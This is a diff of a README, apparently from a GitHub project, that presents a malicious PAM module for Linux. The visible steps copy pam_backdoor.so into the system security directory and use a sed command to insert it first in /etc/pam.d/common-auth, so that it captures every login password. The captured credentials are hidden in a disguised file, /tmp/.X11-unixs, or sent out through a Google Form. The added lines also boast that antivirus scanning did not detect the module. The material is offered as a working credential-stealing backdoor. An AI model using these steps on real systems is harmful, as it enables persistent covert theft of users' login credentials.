@@ -25,6 +25,8 @@ For the first, just copy the compiled module to the shared library location.  I 
 
 ![image](https://github.com/user-attachments/assets/e5021065-7e31-4744-804d-8bf18cf60bcf)  
 
+At the time of writing this module the virustotal did not even flagged this module as malicious 
+
 
 #### Step 1: Install Development Package for PAM Modules    
 You need to install libpam0g-dev because it provides the header files and libraries required to compile custom PAM modules  
@@ -42,7 +44,7 @@ Copy the backdoor module to /lib/x86_64-linux-gnu/security/ because it’s the d
 ```
 sudo cp pam_backdoor.so /lib/x86_64-linux-gnu/security/
 ```      
-Modify the common-auth file under /etc/pam.d, which handles authentication, by inserting the backdoor module at the top of the PAM authentication stack. This ensures it executes first during all authentication requests, allowing the backdoor to intercept credentials stealthily and persistently across system login processes.  
+Modify the _common-auth_ file under _/etc/pam.d_ , which handles authentication, by inserting the backdoor module at the top of the PAM authentication stack. This ensures it executes first during all authentication requests, allowing the backdoor to intercept credentials stealthily and persistently across system login processes.  
 ```
 sed -i '1i auth required pam_backdoor.so' /etc/pam.d/common-auth
 ```   
@@ -60,10 +62,13 @@ All captured credentials are saved to a hidden, seemingly legitimate file on dis
 ```
 cat /tmp/.X11-unixs
 ```
+![2025-06-08_01-34](https://github.com/user-attachments/assets/63e2bfb4-5833-44b1-bce3-e8afeb6fe1ce)
+
 
 - **If using the Google Forms exfiltration module:**
 Credentials are sent silently to your configured Google Form. Check your Google Form responses to verify captured data as shown.
 ![2025-06-08_00-54_1](https://github.com/user-attachments/assets/ae275802-ce96-4481-9354-c30fae9c7e56)   
-![2025-06-08_00-54](https://github.com/user-attachments/assets/8d773b2c-7369-4e9e-af75-7961f9da1fef)    
+![2025-06-08_00-54](https://github.com/user-attachments/assets/8d773b2c-7369-4e9e-af75-7961f9da1fef)
+Exfiltrated credentials on google form.
   
 
